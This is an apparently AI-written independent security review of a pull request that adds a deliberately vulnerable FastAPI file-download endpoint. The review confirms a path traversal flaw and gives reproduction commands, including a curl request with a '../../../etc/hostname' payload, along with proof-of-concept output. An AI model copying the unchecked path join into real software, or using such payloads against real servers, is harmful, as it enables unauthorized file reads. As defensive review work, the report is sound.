# Independent Security Review — PR #2 (run-elem-pr2r3t-20260916-01)

- **Role**: Reviewer (independent)
- **Run ID**: run-elem-pr2r3t-20260916-01
- **Project**: elemiso-pr2r3t-gate
- **Repo**: https://github.com/nghqqa/fastapi-boilerplate-demo
- **PR**: #2 — "High-risk security demo: require human verification before remediation" (OPEN)
- **Head SHA verified**: `1dedf5e1992c950557064d8f4fb9039d1523deb3` (`git rev-parse HEAD` = same)
- **Base SHA**: `4cd5bf099f88c3f3f85ee4c06b7adfe9925a6e5c`
- **Diff scope confirmed** (`git diff 4cd5bf0..HEAD --stat`): **2 files, +122 / -0**
  - A `backend/src/interfaces/api/v1/demo_high_risk.py` (+42)
  - A `backend/tests/unit/test_demo_high_risk_path_traversal.py` (+80)
- **Constraints honored**: no repository file modified; no fix/patch code; zero GitHub writes; own workspace only.

## Verdict

- **STATUS: FINDING_CONFIRMED**
- **SEVERITY: HIGH** (my rating)
- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
  (enables arbitrary file read → also CWE-73 / CWE-200 exposure)
- **HUMAN_VERIFICATION_REQUIRED: YES** — human-gate scenario; remediation only after explicit human security approval.

## 1. User-controlled parameter escapes the base directory — YES

- File: `backend/src/interfaces/api/v1/demo_high_risk.py`
- Function: `demo_download` (`async def demo_download(name: str) -> FileResponse`)
- Key lines:
  - **L28** `DEMO_FILES_DIR = os.path.join(os.path.dirname(__file__), "demo_files_base")`
  - **L41** `file_path = os.path.join(DEMO_FILES_DIR, name)` — user-controlled `name` joined with
    **no normalization and no containment check**.
  - **L42** `return FileResponse(file_path, filename=name)` — serves the resolved (escaped) path.
- `os.path.join` does not neutralize `../`. No `realpath`+`commonpath` containment, no allow-list,
  no `..`/separator filtering. No auth dependency on the route.

## 2. Arbitrary file read outside the base directory — YES

Demonstrated below: a sibling-directory file outside the base dir, and an absolute system file
(`/etc/hostname`), both returned with HTTP 200 and real content.

## 3. Reproduction (one command)

PR test file (deps installed; marker registered — see §5 for why):

```
cd /root/.copaw-worker/reviewer/pr2r3t-work && /opt/venv/standard/bin/python -m pytest backend/tests/unit/test_demo_high_risk_path_traversal.py -q -o markers=security_demo
```

Independent reviewer PoC (real endpoint code path):

```
cd /root/.copaw-worker/reviewer && /opt/venv/standard/bin/python pr2r3t-review-repro.py
```

HTTP-level:

```
curl -s 'http://127.0.0.1:8000/demo-security/demo/download?name=../../../etc/hostname'
```

## 4. Real output summary

### PR's own test file — as written
```
cd .../pr2r3t-work && /opt/venv/standard/bin/python -m pytest backend/tests/unit/test_demo_high_risk_path_traversal.py -q
E  'security_demo' not found in `markers` configuration option   (collection error; --strict-markers)
```
With the marker registered (`-o markers=security_demo`):
```
test_high_risk_path_traversal_reproduces PASSED
test_high_risk_path_traversal_depth      FAILED
E   RuntimeError: File at path /tmp/pytest-of-root/pytest-0/test_high_risk_path_traversal_1/demo-files/sub/../../../deep-secret.txt does not exist.
=================== 1 failed, 1 passed, 3 warnings in 0.36s ====================
```
- Test 1 (`../outside/outside-secret.txt`) **PASSED** → endpoint returned a file from OUTSIDE the
  base dir (leak reproduced; assertion encodes the *vulnerable* behavior).
- Test 2 (deeper `../../../deep-secret.txt`) **FAILED** — I verified the cause is a **fixture/payload
  mismatch**, not a defense: in that layout `sub/../../../deep-secret.txt` resolves to `/tmp/deep-secret.txt`
  (overshoots the tmp dir), while the secret is at `tmp/deep-secret.txt`. Using the correct relative
  path `../../deep-secret.txt` returns the secret: `status=200 body='DEEP-SECRET'`.

### Independent reviewer PoC (`pr2r3t-review-repro.py`)
```
[i] allowed base dir : /tmp/pr2r3t-repro-1_el1vbc/demo_files_base
[i] outside secret   : /tmp/pr2r3t-repro-1_el1vbc/outside-secret.txt
[+] name              : ../outside-secret.txt
[+] HTTP status       : 200
[+] body              : 'TOP-SECRET-OUTSIDE-BASE'
[+] escaped base?     : True
[+] LEAK CONFIRMED    : True
[*] arbitrary read    : name=../../../etc/hostname -> status=200, bytes=13, body='483bb83702a2'
```

## 5. Secondary observations (no fix code)

- The PR's new test uses `@pytest.mark.security_demo`, which is **not registered** in
  `backend/pyproject.toml [tool.pytest.ini_options] markers`, and the config sets `--strict-markers`
  → the test file **fails at collection** as written. Reproducible harness defect.
- `test_high_risk_path_traversal_depth` is off-by-one in its traversal depth/fixture placement and
  fails for the wrong reason (could be misread as "not vulnerable").
- Repo test env needs a large dependency set (crudauth[all], fastcrud, sqladmin, taskiq*, redis,
  aiosqlite, asyncpg, alembic, faker, pytest-asyncio, testcontainers[postgres]); unit-level run of
  the PR file works once installed and the marker is registered.
